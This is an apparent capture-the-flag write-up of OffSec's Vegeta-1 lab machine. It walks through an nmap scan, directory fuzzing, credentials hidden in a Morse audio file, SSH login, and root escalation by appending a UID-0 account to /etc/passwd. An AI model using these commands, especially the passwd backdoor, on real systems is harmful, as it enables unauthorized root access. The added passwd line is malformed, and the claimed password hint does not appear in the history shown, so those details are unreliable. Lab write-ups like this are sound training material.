# 💣 Vegeta-1 Walkthrough (Detailed) – OffSec Proving Grounds

## 📌 Overview

This walkthrough documents the full compromise of the **Vegeta-1 machine**, covering all phases of a penetration test:

* Enumeration
* Web exploitation
* Credential discovery
* Initial access
* Privilege escalation
* Root compromise

The goal was to obtain both **user-level and root-level access**.

---

## 🔍 1. Enumeration

### 🔹 Nmap Scan

We begin with a full TCP scan to identify open ports and services:

```bash
nmap -v -Pn -A -sC -sV <target-ip>
```

### 📊 Results

* **Port 22 (SSH)** → OpenSSH 7.9p1 (Debian)
* **Port 80 (HTTP)** → Apache 2.4.38
* OS detected: Linux (Debian-based)

👉 Observation:
The presence of HTTP suggests a potential attack surface via web enumeration.

---

## 🌐 2. Web Enumeration

### 🔹 Directory Fuzzing

Used directory brute-forcing to discover hidden paths.

👉 Found:

```
/find_me
```

Accessing this directory revealed:

* `find_me.html`

---

### 🔹 File Download

```bash
wget http://<target-ip>/find_me/find_me.html
```

---

## 🔐 3. File Analysis

### 🔹 Inspecting HTML

Using `strings`:

```bash
strings find_me.html
```

👉 Found:

* Base64 encoded data inside HTML comments

---

### 🔹 Analysis Outcome

Initial decoding attempts did not provide useful output.

👉 This suggests:

* Either multi-layer encoding
* Or a decoy requiring further enumeration

---

## 🔁 4. Further Enumeration

Continuing fuzzing revealed another directory:

```
/bulma
```

Inside:

* `hahahaha.wav`

---

### 🔹 Download Audio File

```bash
wget http://<target-ip>/bulma/hahahaha.wav
```

---

## 🎧 5. Audio Analysis (Key Step)

The `.wav` file was analyzed using an online Morse/audio decoder.

### 🔑 Extracted Credentials

```
Username: trunks
Password: u$3r
```

👉 Insight:
This demonstrates how **non-traditional data sources (audio files)** can contain sensitive information.

---

## 💻 6. Initial Access (SSH)

Using the discovered credentials:

```bash
ssh trunks@<target-ip>
```

✔ Successfully gained shell access as user `trunks`

---

## 🚩 7. User Flag

Navigated to the home directory:

```bash
cd /home/trunks
cat local.txt
```

✔ User flag obtained

---

## ⚡ 8. Privilege Escalation Enumeration

### 🔹 Checking Hidden Files

```bash
ls -la
```

👉 Found:

* `.bash_history`

---

### 🔹 Analyzing Bash History

```bash
cat .bash_history
```

### 📌 Critical Finding:

```
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
```

👉 This indicates:

* A user **Tom** with UID 0 (root privileges)
* Possible password hint: `Password@973`

---

## 🔓 9. Privilege Escalation

### 🔹 Modify /etc/passwd

```bash
nano /etc/passwd
```

Add:

```
Tom:ad7t5uIalqMws:0:0:/root:/bin/bash
```

---

### 🔹 Switch User

```bash
su Tom
```

Password:

```
Password@973
```

✔ Root access successfully obtained

---

## 👑 10. Root Flag

Navigate to root directory:

```bash
cd /root
ls
cat proof.txt
```

✔ Root flag captured

---

## 🧠 Key Takeaways

* **Enumeration is critical** — hidden directories revealed the attack path
* **Encoded data requires persistence** — initial failure doesn’t mean dead end
* **Audio steganography / encoding** can hide credentials
* **Poor system configuration** (editable `/etc/passwd`) leads to full compromise
* Always check:

  * `.bash_history`
  * hidden files
  * misconfigurations

---

## 🛠 Tools Used

* Nmap
* Dirbuster / Fuzzing tools
* wget
* SSH
* Linux enumeration techniques
* Morse/audio decoder

---

## ✅ Final Result

| Stage                | Status        |
| -------------------- | ------------- |
| Enumeration          | ✅ Completed   |
| Initial Access       | ✅ Gained      |
| Privilege Escalation | ✅ Achieved    |
| Root Access          | ✅ Compromised |

---

## ⚠️ Disclaimer

This walkthrough is created for **educational purposes only**.
All activities were conducted in a **legal lab environment (OffSec Proving Grounds)**.

---

## 👨‍💻 Author

**Sylvester Dsouza**


---

